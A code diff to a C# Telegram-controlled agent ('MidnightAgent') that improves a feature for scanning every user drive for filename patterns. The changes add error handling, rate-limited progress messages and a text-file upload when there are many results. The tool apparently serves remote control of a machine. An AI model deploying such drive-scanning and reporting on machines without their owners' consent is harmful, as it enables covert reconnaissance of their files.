@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using MidnightAgent.Core;
@@ -69,7 +70,10 @@ namespace MidnightAgent.Features
                 .Select(p => p.Trim()).Where(p => p.Length > 0).ToArray();
             
             if (patterns.Length == 0)
+            {
+                lock (_lock) { _isSearching = false; }
                 return FeatureResult.Fail("No valid patterns provided.");
+            }
 
             var cts = _searchCts;
             string displayPatterns = string.Join(" | ", patterns);
@@ -90,6 +94,7 @@ namespace MidnightAgent.Features
             string currentDir = "";
             DateTime lastUpdate = DateTime.MinValue;
             DateTime startTime = DateTime.Now;
+            int lastFoundCount = 0;
 
             try
             {
@@ -106,8 +111,6 @@ namespace MidnightAgent.Features
                 // Get all user-writable drives (skip system-only drives)
                 var searchRoots = GetSearchRoots();
 
-                int lastFoundCount = 0;
-
                 foreach (var root in searchRoots)
                 {
                     if (token.IsCancellationRequested) break;
@@ -118,7 +121,7 @@ namespace MidnightAgent.Features
             catch (OperationCanceledException) { }
             catch (Exception ex)
             {
-                TelegramInstance?.SendMessage($"❌ Search error: {ex.Message}");
+                try { TelegramInstance?.SendMessage($"❌ Search error: {ex.Message}"); } catch { }
             }
             finally
             {
@@ -127,37 +130,84 @@ namespace MidnightAgent.Features
                     _isSearching = false;
                 }
 
-                // Send final result
-                var elapsed = DateTime.Now - startTime;
-                string status = token.IsCancellationRequested ? "🛑 <b>Search Stopped</b>" : "✅ <b>Search Complete</b>";
-
-                string resultText = $"{status}\n" +
-                    $"Pattern: <b>{EscapeHtml(displayPattern)}</b>\n" +
-                    $"⏱ Time: {elapsed.Minutes}m {elapsed.Seconds}s\n" +
-                    $"📁 Folders: {foldersScanned:N0} | 📄 Files: {filesScanned:N0}\n\n";
-
-                if (results.Count > 0)
+                // การส่งข้อความสรุปผล ต้องครอบด้วย try-catch เสมอ ป้องกันการตายเงียบ
+                try
                 {
-                    resultText += $"🎯 <b>Found {results.Count} file(s):</b>\n";
-                    // Show max 50 results
-                    foreach (var r in results.Take(50))
+                    var elapsed = DateTime.Now - startTime;
+                    string status = token.IsCancellationRequested ? "🛑 <b>Search Stopped</b>" : "✅ <b>Search Complete</b>";
+
+                    string resultText = $"{status}\n" +
+                        $"Pattern: <b>{EscapeHtml(displayPattern)}</b>\n" +
+                        $"⏱ Time: {elapsed.Minutes}m {elapsed.Seconds}s\n" +
+                        $"📁 Folders: {foldersScanned:N0} | 📄 Files: {filesScanned:N0}\n\n";
+
+                    bool sendAsFile = results.Count > 25;
+
+                    if (results.Count > 0)
                     {
-                        resultText += $"  📄 <code>{EscapeHtml(r)}</code>\n";
+                        resultText += $"🎯 <b>Found {results.Count} file(s):</b>\n";
+                        
+                        if (sendAsFile)
+                        {
+                            resultText += "📄 <i>Results are too many, sending as text file...</i>";
+                        }
+                        else
+                        {
+                            foreach (var r in results)
+                            {
+                                resultText += $"  📄 <code>{EscapeHtml(r)}</code>\n";
+                            }
+                        }
                     }
-                    if (results.Count > 50)
-                        resultText += $"\n  ... and {results.Count - 50} more";
+                    else
+                    {
+                        resultText += "❌ No files found.";
+                    }
+
+                    // Update or send the summary message
+                    if (messageId > 0)
+                    {
+                        try { TelegramInstance?.EditMessage(messageId, resultText); }
+                        catch { TelegramInstance?.SendMessage(resultText); }
+                    }
+                    else
+                    {
+                        TelegramInstance?.SendMessage(resultText);
+                    }
+
+                    // If too many results, send as document
+                    if (sendAsFile)
+                    {
+                        try
+                        {
+                            StringBuilder sb = new StringBuilder();
+                            sb.AppendLine($"Search Results for: {displayPattern}");
+                            sb.AppendLine($"Time: {elapsed.Minutes}m {elapsed.Seconds}s");
+                            sb.AppendLine($"Total Found: {results.Count}");
+                            sb.AppendLine(new string('-', 30));
+                            foreach (var r in results)
+                            {
+                                sb.AppendLine(r);
+                            }
+
+                            byte[] fileData = Encoding.UTF8.GetBytes(sb.ToString());
+                            TelegramInstance?.SendDocument(fileData, $"search_results_{DateTime.Now:yyyyMMdd_HHmmss}.txt", $"🎯 Results for {displayPattern}");
+                        }
+                        catch (Exception fileEx)
+                        {
+                            TelegramInstance?.SendMessage($"⚠️ Failed to send results file: {fileEx.Message}");
+                        }
+                    }
                 }
-                else
+                catch (Exception finalEx)
                 {
-                    resultText += "❌ No files found.";
+                    // Fallback สุดท้ายถ้าส่งสรุปไม่ได้จริงๆ
+                    try { TelegramInstance?.SendMessage($"✅ Search Complete, but failed to send summary: {finalEx.Message}"); } catch { }
                 }
-
-                if (messageId > 0)
-                    TelegramInstance?.EditMessage(messageId, resultText);
-                else
-                    TelegramInstance?.SendMessage(resultText);
-
-                DisposeCounters();
+                finally
+                {
+                    DisposeCounters();
+                }
             }
         }
 
@@ -191,13 +241,14 @@ namespace MidnightAgent.Features
                 catch { } // Access denied - skip
 
                 // Update Telegram message:
-                // 1. Every 1.5 seconds OR
-                // 2. Immediately when a new file is found (to let user stop early)
-                bool newFileFound = results.Count > lastFoundCount;
-                
-                if (messageId > 0 && (newFileFound || (DateTime.Now - lastUpdate).TotalMilliseconds > 1500))
+                // อัปเดตทุกๆ 2 วินาทีเท่านั้น เพื่อป้องกัน Telegram API Rate Limit (429 Too Many Requests)
+                if (results.Count > lastFoundCount) 
                 {
-                    lastFoundCount = results.Count;
+                    lastFoundCount = results.Count; // อัปเดตจำนวนที่เจอ แต่ไม่บังคับให้ส่งข้อความทันที
+                }
+
+                if (messageId > 0 && (DateTime.Now - lastUpdate).TotalMilliseconds > 2000)
+                {
                     lastUpdate = DateTime.Now;
                     spinIdx = (spinIdx + 1) % Spinner.Length;
                     var elapsed = DateTime.Now - startTime;
@@ -240,7 +291,7 @@ namespace MidnightAgent.Features
                         $"<i>Send /search stop to cancel</i>";
 
                     try { TelegramInstance?.EditMessage(messageId, progressText); }
-                    catch { }
+                    catch { } // ปล่อยผ่านถ้า error เพื่อให้ค้นหาต่อไปไม่สะดุด
                 }
 
                 // Recurse into subdirectories
